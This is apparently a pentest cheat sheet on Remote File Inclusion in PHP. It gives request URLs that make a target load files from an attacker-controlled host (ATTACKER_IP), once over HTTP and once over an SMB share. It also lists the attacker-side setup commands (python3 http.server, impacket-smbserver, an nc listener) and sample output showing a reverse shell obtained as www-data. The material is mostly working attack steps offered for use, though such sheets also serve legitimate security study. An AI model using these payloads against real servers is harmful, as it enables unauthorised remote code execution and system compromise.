# REMOTE FILE INCLUSION (RFI)

### Check if RFI is possible

```bash
http://$IP/page.php?file=http://ATTACKER_IP/test.txt
```

> See if external URL loads

**Why:** allow_url_include must be ON

<details>
<summary>Example Output</summary>

```
http://10.10.10.5/page.php?file=http://ATTACKER_IP/test.txt

On attacker HTTP server:
10.10.10.5 - - 'GET /test.txt HTTP/1.0' 200 -
(Target fetched your file = RFI works)
```
</details>

---

### RFI with PHP reverse shell

```bash
http://$IP/page.php?file=http://ATTACKER_IP/rev.php
```

> Host a PHP reverse shell on your machine

**Why:** python3 -m http.server 80 first

<details>
<summary>Example Output</summary>

```
Host rev.php on attacker:
python3 -m http.server 80

http://10.10.10.5/page.php?file=http://ATTACKER_IP/rev.php

nc -nlvp 443:
connect to [ATTACKER] from [10.10.10.5]
$ whoami
www-data
```
</details>

---

### RFI with SMB share

```bash
http://$IP/page.php?file=\\ATTACKER_IP\share\rev.php
```

> Host via SMB (no http needed)

**Why:** impacket-smbserver share .

<details>
<summary>Example Output</summary>

```
On attacker:
impacket-smbserver share . -smb2support

http://10.10.10.5/page.php?file=\\ATTACKER_IP\share\rev.php

nc -nlvp 443:
$ whoami
www-data
(Bypasses allow_url_fopen restrictions on some configs)
```
</details>

---
